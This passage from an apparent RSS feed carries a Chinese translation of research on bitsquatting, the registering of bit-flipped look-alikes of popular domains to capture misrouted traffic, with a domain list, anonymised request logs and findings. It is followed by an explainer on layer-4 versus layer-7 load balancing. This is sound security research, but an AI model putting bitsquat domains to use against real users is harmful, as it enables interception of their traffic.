&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mln.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2odn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;6mdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbbdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbcdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbgdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbcdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;gbcdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbcdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fjcdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbcdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;dbcdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;fbcdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;roop-servers.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;root-servers.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;doublechick.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;doubleclick.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;do5bleclick.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;doubleclick.net&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p align=&quot;left&quot;&gt;我使用Python脚本应答DNS请求，并且使用Apache记录HTTP请求。令我惊讶的是，有设备连接了。&lt;/p&gt;
&lt;h3 align=&quot;left&quot;&gt;实验发现&lt;/h3&gt;
&lt;p align=&quot;left&quot;&gt;以下结论是基于2010年9月26日至2011年5月5日间的Apache日志得出的。由搜索引擎爬虫和Web漏洞扫描器引起的日志已经被手动过滤了。正因为是手动操作，所以最后统计时可能还有很小一部分漏网之鱼。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;发现1：比特错误可以被利用在DNS上&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;在记录日志期间总共有52317次针bitsquat域名的请求，它们来自与12949个独立IP。除去其中3次产生巨大网络流量的事件，平均每天有59个独立IP对32个bitsquat域名进行了请求。这些请求不是来自于拼写错误或者其他形式的手工输入URL，还有一部分表现出有多个比特错误的特征。以下是一些实际的例子（个人信息已经移除）：&lt;/p&gt;
&lt;div style=&quot;background-color: #eeeeee;&quot;&gt;
&lt;p align=&quot;left&quot;&gt;static.ak.fjcdn.net 109.242.50.xxx “GET /rsrc.php/z67NS/hash/4ys0envq.js HTTP/1.1″ “http://www.facebook.com/profile.php?id=xxxxxxxxxx” “Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; WOW64; Trident/4.0; GTB6.5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.2; Hotbar 11.0.78.0; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; AskTbZTV/5.8.0.12304)”&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;msgr.dlservice.mic2osoft.com 213.178.224.xxx “GET /download/A/6/1/A616CCD4-B0CA-4A3D-B975-3EDB38081B38/ar/wlsetup-cvr.exe HTTP/1.1″ 404 268 “Microsoft BITS/6.6″&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;s0.2ldn.net 66.82.9.xxx “GET /879366/flashwrite_1_2.js HTTP/1.1″ “http://webmail.satx.rr.com/_uac/adpage.html” “Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; HPNTDF; AskTB5.2)”&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;mmv.admob.com 109.175.185.xxx “GET /static/iphone/img/app@2x.png HTTP/1.1″ “Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; HW iPhone2,1; en_gb) AppleWebKit/525.18.1 (KHTML, like Gecko) (AdMob-iSDK-20101108; iphoneos4.2)”&lt;/p&gt;
&lt;/div&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;发现2：并不是所有的比特错误都造成同等程度的影响&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;有些机器相比其他而言，明显控制着更多的网络流量。当一个比特错误发生在普通PC机或者手机上时，它只会影响到一个用户。然而当它发生在代理、DNS服务器或者数据库缓存中时，将会影响到成千上万的用户。在我的实验中，已经观察到了比特错误出现在Web应用、DNS解析服务器和代理服务器中。例如，一个比特错误将fbcnd.net变为fbbdn.net，将使上千个开心农场的玩家请求到我的服务器。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;发现3：手机和嵌入式设备可能比传统硬件受的影响更大&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;我对2011年3月期间访问Wikipedia和bitsquat域名的HTTP User-Agent进行了对比，展示在下面的图例中。其中Other包括了各种手机、游戏机控制台和其他嵌入式设备，它们在对bitsquat域名的访问中，增加的幅度最大。令人好奇的是，来自MacOS针对bitsquat域名的访问相比Wikipedia有显著减少，对此我还没有一个合理的解释。（译注：这里是按两个域名各自的设备分布算的，其中有增多必然有减少，也许分别计算每种设备访问错域名的几率更加合理，即&lt;i&gt;访问错误域名的次数 / 对两种域名的访问总数&lt;/i&gt;。）&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/f435855d0cd7c34aa3ae589293727d00.png&quot; rel=&quot;lightbox[74149]&quot; title=&quot;一比特之差：无需利用漏洞的DNS劫持&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-74152&quot; alt=&quot;bitsquat_1&quot; src=&quot;/images/jobbole.com/d6868d8be74912de5d5ab88747e4aace.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;发现4：对bitsquat域名的访问流量是日常网络流量的真实写照&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;Bitsquat域名的访问者来自于全球各地，其使用的设备也几乎涵盖每种主流的操作系统和嵌入式平台。除使用MacOS的访问者所占的百分比在两种域名间有显著差别之外，使用Windows、Linux、Android和iPhones的百分比基本相同。另外，基于IP地理位置数据库，我们可以观察到来自于美国的访问者在一天内的流量走势。&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/ade11df8bbcc2b7bcbd7e3564ed2cdfa.png&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/ade11df8bbcc2b7bcbd7e3564ed2cdfa.png&quot; rel=&quot;lightbox[74149]&quot; title=&quot;一比特之差：无需利用漏洞的DNS劫持&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-74153&quot; alt=&quot;bitsquat_2&quot; src=&quot;/images/jobbole.com/15bbd2df363455797824469e667561cb.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;发现5：HTTPS/TLS不会有帮助，DNSSEC可能会有一丁点&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;HTTP 1.1在头中包含了一个叫Host的字段，其数值是客户端想要访问的域名。如果Host中包含着bitsquat域名，那么比特错误在域名解析前就发生了。如果Host中是原始域名，那么错误就是发生在域名解析中。我数据中96%的情况是在DNS解析前就出现了比特错误。&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/a78196125356295d8d331b1a05dc252a.png&quot; rel=&quot;lightbox[74149]&quot; title=&quot;一比特之差：无需利用漏洞的DNS劫持&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-74154&quot; alt=&quot;bitsquat_3&quot; src=&quot;/images/jobbole.com/cd7c742d1f56b45900a483b0ed4471db.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;像SSL和TLS这种安全传输技术是用于保证两端之间数据的机密性、真实性和完整性，但是比特错误更多发生在数据在某一端还未传输的时候。DNSSEC只能解决那4%发生在域名解析过程中的比特错误。&lt;/p&gt;
&lt;h2 align=&quot;left&quot;&gt;数据&lt;/h2&gt;
&lt;p align=&quot;left&quot;&gt;DNS流量的全部PCAP在此：&lt;a href=&quot;http://dinaburg.org/data/dnslogs.tar.7z&quot;&gt;dnslogs.tar.7z&lt;/a&gt;，56Mb&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;HTTP日志可能包含个人信息，因此不会公开发布。如果你有正当的研究目的需要它们，请&lt;a href=&quot;http://dinaburg.org/about.html&quot;&gt;联系我&lt;/a&gt;。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;这里有个工具可以快速识别潜在的bitsquat域名：&lt;a href=&quot;http://dinaburg.org/data/bitsquat.py&quot;&gt;bitsquat.py&lt;/a&gt;，&lt;a href=&quot;https://github.com/artemdinaburg/bitsquat-script&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;h2 align=&quot;left&quot;&gt;进一步研究&lt;/h2&gt;
&lt;p align=&quot;left&quot;&gt;来自Verisign的Duane Wessels也在DNS查询中寻找过网络级别的比特错误，他指出“&lt;b&gt;&lt;a href=&quot;http://www.verisigninc.com/assets/VRSN_Bitsquatting_TR_20120320.pdf&quot;&gt;网络中比特错误相对而言是很少见的，但是有一个可预期的概率&lt;/a&gt;&lt;/b&gt;”。他研究的主要目的，是确定那4%发生在域名解析时的比特错误是否由UDP包在传输后的损坏造成。结论是网络中传输的包不太可能被损坏，用他自己的话说：“我们相信UDP的校验和能够有效防范bitsquat攻击或者其他DNS查询时的错误。无论如何，在进入网络前发生的比特错误不会从中受益，因为在传输前计算的校验和是基于错误的数据得出的。“&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;我非常鼓励读者重复我的实验，并且分享你们的结果。如果需要更多信息，请随时&lt;a href=&quot;http://dinaburg.org/about.html&quot;&gt;联系我&lt;/a&gt;。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Thu, 24 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-24-74149-9c77c2cb8.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-24-74149-9c77c2cb8.html</guid>
        
        
      </item>
    
      <item>
        <title>四层和七层负载均衡的区别</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;（一）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;简单理解四层和七层负载均衡:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;&lt;strong&gt;① &lt;/strong&gt;所谓四层就是基于IP+端口的负载均衡；七层就是基于URL等应用层信息的负载均衡；同理，还有基于MAC地址的二层负载均衡和基于IP地址的三层负载均衡。 换句换说，二层负载均衡会通过一个虚拟MAC地址接收请求，然后再分配到真实的MAC地址；三层负载均衡会通过一个虚拟IP地址接收请求，然后再分配到真实的IP地址；四层通过虚拟IP+端口接收请求，然后再分配到真实的服务器；七层通过虚拟的URL或主机名接收请求，然后再分配到真实的服务器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;② &lt;/strong&gt;所谓的四到七层负载均衡，就是在对后台的服务器进行负载均衡时，依据四层的信息或七层的信息来决定怎么样转发流量。 比如四层的负载均衡，就是通过发布三层的IP地址（VIP），然后加四层的端口号，来决定哪些流量需要做负载均衡，对需要处理的流量进行NAT处理，转发至后台服务器，并记录下这个TCP或者UDP的流量是由哪台服务器处理的，后续这个连接的所有流量都同样转发到同一台服务器处理。七层的负载均衡，就是在四层的基础上（没有四层是绝对不可能有七层的），再考虑应用层的特征，比如同一个Web服务器的负载均衡，除了根据VIP加80端口辨别是否需要处理的流量，还可根据七层的URL、浏览器类别、语言来决定是否要进行负载均衡。举个例子，如果你的Web服务器分成两组，一组是中文语言的，一组是英文语言的，那么七层负载均衡就可以当用户来访问你的域名时，自动辨别用户语言，然后选择对应的语言服务器组进行负载均衡处理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;③ &lt;/strong&gt;负载均衡器通常称为四层交换机或七层交换机。四层交换机主要分析IP层及TCP/UDP层，实现四层流量负载均衡。七层交换机除了支持四层负载均衡以外，还有分析应用层的信息，如HTTP协议URI或Cookie信息。&lt;/p&gt;
&lt;p&gt;1、负载均衡分为L4 switch（四层交换），即在OSI第4层工作，就是TCP层啦。此种Load Balance不理解应用协议（如HTTP/FTP/MySQL等等）。例子：LVS，F5。&lt;/p&gt;
&lt;p&gt;2、另一种叫做L7 switch（七层交换），OSI的最高层，应用层。此时，该Load Balancer能理解应用协议。例子：  haproxy，MySQL Proxy。&lt;/p&gt;
&lt;p&gt;注意：上面的很多Load Balancer既可以做四层交换，也可以做七层交换。&lt;/p&gt;
&lt;p&gt;（二）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　负载均衡设备也常被称为”四到七层交换机”，那么四层和七层两者到底区别在哪里？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　第一，技术原理上的区别。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　所谓四层负载均衡&lt;/strong&gt;，也就是主要通过报文中的目标地址和端口，再加上负载均衡设备设置的服务器选择方式，决定最终选择的内部服务器。&lt;/p&gt;
&lt;p&gt;以常见的TCP为例，负载均衡设备在接收到第一个来自客户端的SYN 请求时，即通过上述方式选择一个最佳的服务器，并对报文中目标IP地址进行修改(改为后端服务器IP），直接转发给该服务器。TCP的连接建立，即三次握手是客户端和服务器直接建立的，负载均衡设备只是起到一个类似路由器的转发动作。在某些部署情况下，为保证服务器回包可以正确返回给负载均衡设备，在转发报文的同时可能还会对报文原来的源地址进行修改。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/b91593dea3eb4eeaacc72d17c55295c4.png&quot; rel=&quot;lightbox[74131]&quot; title=&quot;四层和七层负载均衡的区别&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-74132&quot; alt=&quot;03114159-1d39f32589b04705b65bf5bda16d2252&quot; src=&quot;/images/jobbole.com/8483cda2a4febf251cbf250fc9ae6c06.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所&lt;/strong&gt;&lt;strong&gt;谓七层负载均衡&lt;/strong&gt;，也称为“内容交换”，也就是主要通过报文中的真正有意义的应用层内容，再加上负载均衡设备设置的服务器选择方式，决定最终选择的内部服务器。&lt;/p&gt;
&lt;p&gt;以常见的TCP为例，负载均衡设备如果要根据真正的应用层内容再选择服务器，只能先代理最终的服务器和客户端建立连接(三次握手)后，才可能接受到客户端发送的真正应用层内容的报文，然后再根据该报文中的特定字段，再加上负载均衡设备设置的服务器选择方式，决定最终选择的内部服务器。负载均衡设备在这种情况下，更类似于一个代理服务器。负载均衡和前端的客户端以及后端的服务器会分别建立TCP连接。所以从这个技术原理上来看，七层负载均衡明显的对负载均衡设备的要求更高，处理七层的能力也必然会低于四层模式的部署方式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　第二，应用场景的需求。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;七层应用负载的好处，是使得整个网络更”&lt;strong&gt;智能化&lt;/strong&gt;“。例如访问一个网站的用户流量，可以通过七层的方式，将对图片类的请求转发到特定的图片服务器并可以使用缓存技术；将对文字类的请求可以转发到特定的文字服务器并可以使用压缩技术。当然这只是七层应用的一个小案例，从技术原理上，这种方式可以对客户端的请求和服务器的响应进行任意意义上的修改，极大的提升了应用系统在网络层的灵活性。很多在后台，例如Nginx或者Apache上部署的功能可以前移到负载均衡设备上，例如客户请求中的Header重写，服务器响应中的关键字过滤或者内容插入等功能。&lt;/p&gt;
&lt;p&gt;另外一个常常被提到功能就&lt;strong&gt;是&lt;/strong&gt;安全性。网络中最常见的SYN Flood攻击，即黑客控制众多源客户端，使用虚假IP地址对同一目标发送SYN攻击，通常这种攻击会大量发送SYN报文，耗尽服务器上的相关资源，以达到Denial of Service(&lt;em&gt;DoS&lt;/em&gt;)的目的。从技术原理上也可以看出，四层模式下这些SYN攻击都会被转发到后端的服务器上；而七层模式下这些SYN攻击自然在负载均衡设备上就截止，不会影响后台服务器的正常运营。另外负载均衡设备可以在七层层面设定多种策略，过滤特定报文，例如SQL Injection等应用层面的特定攻击手段，从应用层面进一步提高系统整体安全。&lt;/p&gt;
&lt;p&gt;现在的7层负载均衡，主要还是着重于&lt;strong&gt;应用&lt;/strong&gt;HTTP协议，所以其应用范围主要是众多的网站或者内部信息平台等基于B/S开发的系统。 4层负载均衡则对应其他TCP应用，例如基于C/S开发的ERP等系统。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　第三，七层应用需要考虑的问题。&lt;a href=&quot;http://hi.baidu.com/aking_roc&quot; target=&quot;_blank&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　1：是否真的必要&lt;/strong&gt;，七层应用的确可以提高流量智能化，同时必不可免的带来设备配置复杂，负载均衡压力增高以及故障排查上的复杂性等问题。在设计系统时需要考虑四层七层同时应用的混杂情况。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　2：是否真的可以提高安全性&lt;/strong&gt;。例如SYN Flood攻击，七层模式的确将这些流量从服务器屏蔽，但负载均衡设备本身要有强大的抗DDoS能力，否则即使服务器正常而作为中枢调度的负载均衡设备故障也会导致整个应用的崩溃。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　3：是否有足够的灵活度&lt;/strong&gt;。七层应用的优势是可以让整个应用的流量智能化，但是负载均衡设备需要提供完善的七层功能，满足客户根据不同情况的基于应用的调度。最简单的一个考核就是能否取代后台Nginx或者Apache等服务器上的调度功能。能够提供一个七层应用开发接口的负载均衡设备，可以让客户根据需求任意设定功能，才真正有可能提供强大的灵活性和智能性。&lt;/p&gt;
&lt;p&gt;（三）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　负载均衡四七层介绍:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;负载均衡（Load Balance）建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。&lt;/p&gt;
&lt;p&gt;负载均衡有两方面的含义：首先，大量的并发访问或数据流量分担到多台节点设备上分别处理，减少用户等待响应的时间；其次，单个重负载的运算分担到多台节点设备上做并行处理，每个节点设备处理结束后，将结果汇总，返回给用户，系统处理能力得到大幅度提高。&lt;/p&gt;
&lt;p&gt;本文所要介绍的负载均衡技术主要是指在均衡服务器群中所有服务器和应用程序之间流量负载的应用，目前负载均衡技术大多数是用于提高诸如在Web服务器、FTP服务器和其它关键任务服务器上的Internet服务器程序的可用性和可伸缩性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　负载均衡技术分类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前有许多不同的负载均衡技术用以满足不同的应用需求，下面从负载均衡所采用的设备对象、应用的网络层次（指OSI参考模型）及应用的地理结构等来分类。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　软/硬件负载均衡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;软件负载均衡解决方案是指在一台或多台服务器相应的操作系统上安装一个或多个附加软件来实现负载均衡，如DNS Load Balance，CheckPoint Firewall-1 ConnectControl等，它的优点是基于特定环境，配置简单，使用灵活，成本低廉，可以满足一般的负载均衡需求。&lt;/p&gt;
&lt;p&gt;软件解决方案缺点也较多，因为每台服务器上安装额外的软件运行会消耗系统不定量的资源，越是功能强大的模块，消耗得越多，所以当连接请求特别大的时候，软件本身会成为服务器工作成败的一个关键；软件可扩展性并不是很好，受到操作系统的限制；由于操作系统本身的Bug，往往会引起安全问题。&lt;/p&gt;
&lt;p&gt;硬件负载均衡解决方案是直接在服务器和外部网络间安装负载均衡设备，这种设备我们通常称之为负载均衡器，由于专门的设备完成专门的任务，独立于操作系统，整体性能得到大量提高，加上多样化的负载均衡策略，智能化的流量管理，可达到最佳的负载均衡需求。&lt;/p&gt;
&lt;p&gt;负载均衡器有多种多样的形式，除了作为独立意义上的负载均衡器外，有些负载均衡器集成在交换设备中，置于服务器与Internet链接之间，有些则以两块网络适配器将这一功能集成到PC中，一块连接到Internet上，一块连接到后端服务器群的内部网络上。&lt;/p&gt;
&lt;p&gt;一般而言，硬件负载均衡在功能、性能上优于软件方式，不过成本昂贵。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　本地/全局负载均衡&lt;a href=&quot;http://hi.baidu.com/aking_roc&quot; target=&quot;_blank&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;负载均衡从其应用的地理结构上分为本地负载均衡(Local Load Balance)和全局负载均衡(Global Load Balance，也叫地域负载均衡)，本地负载均衡是指对本地的服务器群做负载均衡，全局负载均衡是指对分别放置在不同的地理位置、有不同网络结构的服务器群间作负载均衡。&lt;/p&gt;
&lt;p&gt;本地负载均衡能有效地解决数据流量过大、网络负荷过重的问题，并且不需花费昂贵开支购置性能卓越的服务器，充分利用现有设备，避免服务器单点故障造成数据流量的损失。其有灵活多样的均衡策略把数据流量合理地分配给服务器群内的服务器共同负担。即使是再给现有服务器扩充升级，也只是简单地增加一个新的服务器到服务群中，而不需改变现有网络结构、停止现有的服务。&lt;/p&gt;
&lt;p&gt;全局负载均衡主要用于在一个多区域拥有自己服务器的站点，为了使全球用户只以一个IP地址或域名就能访问到离自己最近的服务器，从而获得最快的访问速度，也可用于子公司分散站点分布广的大公司通过Intranet（企业内部互联网）来达到资源统一合理分配的目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　网络层次上的负载均衡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;针对网络上负载过重的不同瓶颈所在，从网络的不同层次入手，我们可以采用相应的负载均衡技术来解决现有问题。&lt;/p&gt;
&lt;p&gt;随着带宽增加，数据流量不断增大，网络核心部分的数据接口将面临瓶颈问题，原有的单一线路将很难满足需求，而且线路的升级又过于昂贵甚至难以实现，这时就可以考虑采用链路聚合（Trunking）技术。&lt;/p&gt;
&lt;p&gt;链路聚合技术（第二层负载均衡）将多条物理链路当作一条单一的聚合逻辑链路使用，网络数据流量由聚合逻辑链路中所有物理链路共同承担，由此在逻辑上增大了链路&lt;a href=&quot;http://hi.baidu.com/aking_roc&quot; target=&quot;_blank&quot;&gt;的&lt;/a&gt;容量，使其能满足带宽增加的需求。&lt;/p&gt;
&lt;p&gt;现代负载均衡技术通常操作于网络的第四层或第七层。第四层负载均衡将一个Internet上合法注册的IP地址映射为多个内部服务器的IP地址，对每次 TCP连接请求动态使用其中一个内部IP地址，达到负载均衡的目的。在第四层交换机中，此种均衡技术得到广泛的应用，一个目标地址是服务器群VIP（虚拟 IP，Virtual IP address）连接请求的数据包流经交换机，交换机根据源端和目的IP地址、TCP或UDP端口号和一定的负载均衡策略，在服务器IP和VIP间进行映射，选取服务器群中最好的服务器来处理连接请求。&lt;/p&gt;
&lt;p&gt;第七层负载均衡控制应用层服务的内容，提供了一种对访问流量的高层控制方式，适合对HTTP服务器群的应用。第&lt;strong&gt;七层负载均衡技术通过检查流经的HTTP报头，根据报头内的信息来执行负载均衡任务&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;第七层负载均衡优点表现在如下几个方面：&lt;/p&gt;
&lt;p&gt;通过对HTTP报头的检查，可以检测出HTTP400、500和600系列的错误信息，因而能透明地将连接请求重新定向到另一台服务器，避免应用层故障。&lt;/p&gt;
&lt;p&gt;可根据流经的数据类型（如判断数据包是图像文件、压缩文件或多媒体文件格式等），把数据流量引向相应内容的服务器来处理，增加系统性能。&lt;/p&gt;
&lt;p&gt;能根据连接请求的类型，如是普通文本、图象等静态文档请求，还是asp、cgi等的动态文档请求，把相应的请求引向相应的服务器来处理，提高系统的性能及安全性。&lt;/p&gt;
&lt;p&gt;第七层负载均衡受到其所支持的协议限制（一般只有HTTP），这样就限制了它应用的广泛性，并且检查HTTP报头会占用大量的系统资源，势必会影响到系统的性能，在大量连接请求的情况下，负载均衡设备自身容易成为网络整体性能的瓶颈。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;负载均衡策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际应用中，我们可能不想仅仅是把客户端的服务请求平均地分配给内部服务器，而不管服务器是否宕机。而是想使Pentium III服务器比Pentium II能接受更多的服务请求，一台处理服务请求较少的服务器能分配到更多的服务请求，出现故障的服务器将不再接受服务请求直至故障恢复等等。&lt;/p&gt;
&lt;p&gt;选择合适的负载均衡策略，使多个设备能很好的共同完成任务，消除或避免现有网络负载分布不均、数据流量拥挤反应时间长的瓶颈。在各负载均衡方式中，针对不同的应用需求，在OSI参考模型的第二、三、四、七层的负载均衡都有相应的负载均衡策略。&lt;/p&gt;
&lt;p&gt;负载均衡策略的优劣及其实现的难易程度有两个关键因素：一、负载均衡算法，二、对网络系统状况的检测方式和能力。&lt;/p&gt;
&lt;p&gt;考虑到服务请求的不同类型、服务器的不同处理能力以及随机选择造成的负载分配不均匀等问题，为了更加合理的把负载分配给内部的多个服务器，就需要应用相应的能够正确反映各个服务器处理能力及网络状态的&lt;strong&gt;负载均衡算法&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;轮循均衡（Round Robin）：每一次来自网络的请求轮流分配给内部中的服务器，从1至N然后重新开始。此种均衡算法适合于服务器组中的所有服务器都有相同的软硬件配置并且平均服务请求相对均衡的情况。&lt;/p&gt;
&lt;p&gt;权重轮循均衡（Weighted Round Robin）：根据服务器的不同处理能力，给每个服务器分配不同的权值，使其能够接受相应权值数的服务请求。例如：服务器A的权值被设计成1，B的权值是 3，C的权值是6，则服务器A、B、C将分别接受到10%、30％、60％的服务请求。此种均衡算法能确保高性能的服务器得到更多的使用率，避免低性能的服务器负载过重。&lt;/p&gt;
&lt;p&gt;随机均衡（Random）：把来自网络的请求随机分配给内部中的多个服务器。&lt;/p&gt;
&lt;p&gt;权重随机均衡（Weighted Random）：此种均衡算法类似于权重轮循算法，不过在处理请求分担时是个随机选择的过程。&lt;/p&gt;
&lt;p&gt;响应速度均衡（Response Time）：负载均衡设备对内部各服务器发出一个探测请求（例如Ping），然后根据内部中各服务器对探测请求的最快响应时间来决定哪一台服务器来响应客户端的服务请求。此种均衡算法能较好的反映服务器的当前运行状态，但这最快响应时间仅仅指的是负载均衡设备与服务器间的最快响应时间，而不是客户端与服务器间的最快响应时间。&lt;/p&gt;
